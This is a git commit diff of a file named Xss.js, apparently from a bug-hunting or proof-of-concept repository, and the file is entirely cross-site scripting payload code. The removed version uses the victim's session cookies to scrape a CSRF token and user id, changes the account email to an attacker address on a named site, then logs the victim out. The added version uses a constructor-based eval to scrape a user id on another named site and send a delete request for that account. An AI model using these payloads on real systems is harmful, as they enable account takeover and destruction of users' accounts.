ed0fba956804632e0e06c620fb2f47246b544340
Jems Patel <138519936+jems-007@users.noreply.github.com>
2026-05-22 10:32:53 +0530

    Update Xss.js

--- Xss.js
+++ Xss.js
@@ -1,10 +1,7 @@
-let t;
-fetch('/me',{credentials:'include'}).then(r=>r.text()).then(h=>{
-  const csrfMatch=h.match(/csrf-token&quot; content=&quot;([^&quot;]+)/)||h.match(/name="_token" value="([^"]+)/);
-  if(!csrfMatch)return;
-  t=csrfMatch[1];
-  const uidMatch=h.match(/users\/(\d+)/)||h.match(/"id":(\d+)/);
-  if(!uidMatch)return;
-  const u=uidMatch[1];
-  return fetch('https://netstudio.support/users/'+u,{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({id:u,_token:t,_method:'patch',email:'vijay+attacker@whitenet.io'})});
-}).then(()=>fetch('/logout',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({_token:t})})).catch(()=>{});
+this.constructor.constructor(`
+fetch('https://suitex.simplify360.com/Group',{credentials:'include'})
+.then(r=>r.text())
+.then(t=>{let id=t.match(/var currUserId = ['"](\\d+)['"]/)[1];
+if(confirm('Delete '+id+'?'))
+fetch('https://suitex.simplify360.com/bulkOperationUser',{method:'POST',credentials:'include',body:'ids='+id+'&type=delete'})
+})`)()
